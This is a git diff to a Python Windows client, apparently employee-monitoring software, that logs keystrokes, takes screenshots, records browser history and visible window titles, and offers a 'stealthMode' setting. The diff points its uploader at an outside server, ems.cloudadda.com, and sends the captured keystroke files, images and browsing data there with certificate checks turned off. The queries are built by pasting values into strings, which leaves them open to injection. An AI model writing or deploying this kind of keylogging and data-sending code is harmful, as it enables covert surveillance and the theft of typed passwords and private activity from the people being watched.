@@ -2,8 +2,8 @@ from mss import mss
 import glob, os, threading, json, datetime, time, requests, random
 from pynput import keyboard
 from sys import argv
-from pywinauto import Desktop
 from win32api import GetUserName
+
 requests.packages.urllib3.disable_warnings()
 
 strokes = []
@@ -140,18 +140,44 @@ class app_usage_tracking(threading.Thread):
 		threading.Thread.__init__(self)
 		self.date = str(datetime.datetime.now().date())
 		self.opened_apps = ( dict(json.load(open(ROOT_DIR + DEV_LOC + "\\user_data\\{}\\apps_usage.json".format(self.date), 'r'))) if os.path.isfile(ROOT_DIR + DEV_LOC + "\\user_data\\{}\\apps_usage.json".format(self.date)) else {})
+		self.last_send = datetime.datetime.now()
 		self.interval_time = 5
 		self.kill = False
 		print("Created App usage tracker thread")
 
+	def return_opened_apps(self):
+		titles = []
+		try:
+			import ctypes
+			EnumWindows = ctypes.windll.user32.EnumWindows
+			EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
+			GetWindowText = ctypes.windll.user32.GetWindowTextW
+			GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
+			IsWindowVisible = ctypes.windll.user32.IsWindowVisible
+			
+			def foreach_window(hwnd, lParam):
+				if IsWindowVisible(hwnd):
+					length = GetWindowTextLength(hwnd)
+					buff = ctypes.create_unicode_buffer(length + 1)
+					GetWindowText(hwnd, buff, length + 1)
+					if buff.value != "":
+						titles.append(buff.value)
+				return True
+			EnumWindows(EnumWindowsProc(foreach_window), 0)
+		except ImportError:
+			pass
+		return list(set(titles))
+
 	def get_opened_apps(self):
 		try:
-			for app in [ w.window_text().split("- ")[-1] for w in Desktop(backend="uia").windows() if w.window_text() not in ('', 'Taskbar') ]:
+			elapsed_time = (datetime.datetime.now() - self.last_send).total_seconds()
+			for app in self.return_opened_apps():
 				if app in self.opened_apps.keys():
-					self.opened_apps[app] += self.interval_time
+					self.opened_apps[app] += elapsed_time
 				else:
-					self.opened_apps[app] = 0
+					self.opened_apps[app] = elapsed_time
 				json.dump(dict(self.opened_apps), open(ROOT_DIR + DEV_LOC + '\\user_data\\{}\\apps_usage.json'.format(self.date), "w+"))
+			self.last_send = datetime.datetime.now()
 			self.opened_apps = {k: v for k,v in sorted(self.opened_apps.items(), key=lambda kv: kv[1], reverse=True)}
 		except Exception as e:
 			print(e)
@@ -293,20 +319,23 @@ class UserDataUploader(threading.Thread):
 		threading.Thread.__init__(self)
 		self.email = email
 		self.token = token
-		self.base_url = "http://127.0.0.1:8000/"
+		self.base_url = "https://ems.cloudadda.com/"
 		print("Started Image uploading service.")
 
 	def add_browser_data(self):
-		data = db_conn.fetch_all("SELECT * FROM browser_history")
-		rm = True
-		for db in data:
-			query = f'mutation add_browser_usage{{ addBrowserUsage(email: "{self.email}", token: "{self.token}", url: "{db[0]}", description: {json.dumps(db[1])}, visitTime: "{db[2]}", visitCount: {str(db[3])}) {{ result }} }}'
-			res = requests.post(url = f"{self.base_url}api/", json = {'query': query}, verify = False)
-			if res.status_code != 200:
-				rm = False
-				break
-		if rm:
-			db_conn.execute("DELETE FROM browser_history;", commit = True)
+		try:
+			data = db_conn.fetch_all("SELECT * FROM browser_history")
+			rm = True
+			for db in data:
+				query = f'mutation add_browser_usage{{ addBrowserUsage(email: "{self.email}", token: "{self.token}", url: "{db[0]}", description: {json.dumps(db[1])}, visitTime: "{db[2]}", visitCount: {str(db[3])}) {{ result }} }}'
+				res = requests.post(url = f"{self.base_url}api/", json = {'query': query}, verify = False)
+				if res.status_code != 200:
+					rm = False
+					break
+			if rm:
+				db_conn.execute("DELETE FROM browser_history;", commit = True)
+		except Exception as e:
+			self.send_error(str(e), "add_browser_data")
 
 	def add_key_strokes(self):
 		dat_files = glob.glob(ROOT_DIR + DEV_LOC + "\\user_data\\*\\*.ks")
@@ -327,7 +356,7 @@ class UserDataUploader(threading.Thread):
 					if dl:
 						os.remove(file)
 			except Exception as e:
-				print("Error uploading file", file, file_name, e)
+				self.send_error(f"Error uploading file {file}, {file_name}, {e}", "add_key_strokes")
 
 	def send_app_usage_data(self):
 		apps_usage_file = glob.glob(ROOT_DIR + DEV_LOC + "\\user_data\\*\\apps_usage.json")
@@ -335,18 +364,21 @@ class UserDataUploader(threading.Thread):
 			try:
 				dt = file.split("\\")[-2]
 				rm = True
-				with open(file) as fl:
-					dat = json.load(fl)
-					for app, tm in dat.items():
-						query = f""" mutation add_app_usage{{ addAppUsage(email: "{self.email}", token: "{self.token}", appName: {json.dumps(app)}, openTime: {tm}, date: "{dt}") {{ result }} }} """
-						req = requests.post(url = f"{self.base_url}api/", json = {'query': query}, verify = False)
-						if req.status_code != 200:
-							rm = False
-							break
+				if dt != str(datetime.date.today()):
+					with open(file) as fl:
+						dat = json.load(fl)
+						for app, tm in dat.items():
+							query = f""" mutation add_app_usage{{ addAppUsage(email: "{self.email}", token: "{self.token}", appName: {json.dumps(app)}, openTime: {tm}, date: "{dt}") {{ result }} }} """
+							req = requests.post(url = f"{self.base_url}api/", json = {'query': query}, verify = False)
+							if req.status_code != 200:
+								rm = False
+								break
+				else:
+					rm = False
 				if rm:
 					os.remove(file)
 			except Exception as e:
-				pass
+				self.send_error(str(e), "send_app_usage_data")
 
 	def add_images(self):
 		img_fls = glob.glob(ROOT_DIR + DEV_LOC + "\\user_data\\*\\images\\*.png")
@@ -366,21 +398,40 @@ class UserDataUploader(threading.Thread):
 				if rm:
 					os.remove(file)
 			except Exception as e:
-				print("Error uploading file", file, file_name, e)
+				self.send_error(str(e), "add_images")
+
+	def send_error(self, error, where):
+		try:
+			query = f""" mutation add_user_error{{	addUserError(email:"{self.email}", error:"{error}", where:"{where}")	{{	result	}}	}} """
+			requests.post(f"{self.base_url}api", json={"query": query})
+		except Exception as e:
+			print(e)
 
 	def run(self):
 		while True:
-			# self.add_browser_data()
-			self.add_images()
-			self.add_key_strokes()
-			self.send_app_usage_data()
+			try:
+				self.add_browser_data()
+			except Exception as e:
+				pass
+			try:
+				self.add_images()
+			except Exception as e:
+				pass
+			try:
+				self.add_key_strokes()
+			except Exception as e:
+				pass
+			try:
+				self.send_app_usage_data()
+			except Exception as e:
+				pass
 			time.sleep(random.randint(180, 600))
 
 class mode_listener(threading.Thread):
 	def __init__(self, email, token, mode = 4):
 		threading.Thread.__init__(self)
 		self.monitor_thread = user_client(mode = mode)
-		self.base_url = "http://127.0.0.1:8000/api/"
+		self.base_url = "https://ems.cloudadda.com/api/"
 		self.email = email
 		self.token = token
 
@@ -453,17 +504,18 @@ if __name__ == "__main__":
 	token = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'token';")
 	if (email == None) or (token == None):
 		print("not working")
-		# conn.execute(""" UPDATE kv_pair SET value = 0 WHERE key = 'register'; """)
 		db_conn.execute("INSERT INTO kv_pair (key, value) VALUES ('register', '0');", commit = True)
 	else:
 		email = email[0]
 		token = token[0]
 		if not os.path.isfile(ROOT_DIR +  DEV_LOC + "\\config.json"):
 			query = f'query get_user_config{{ getUserConfig(email: "{email}", token: "{token}"){{ role, captureScreenShots, activeKeyLogger, browserTrackingHistory, appsUsageTracking, stealthMode }} }}'
-			res = requests.post(url = "http://127.0.0.1:8000/api/", json = {'query': query}, verify = False)
+			print(query)
+			res = requests.post(url = "https://ems.cloudadda.com/api/", json = {'query': query}, verify = False)
 			if res.status_code == 200:
 				json_data = res.json()
-				if "data" in json_data and "getUserConfig" in json_data["data"]:
+				print(json_data)
+				if "data" in json_data and "getUserConfig" in json_data["data"] and (json_data['data']['getUserConfig']):
 					resp = json_data['data']['getUserConfig']
 					config = {
 						"role": resp['role'], 
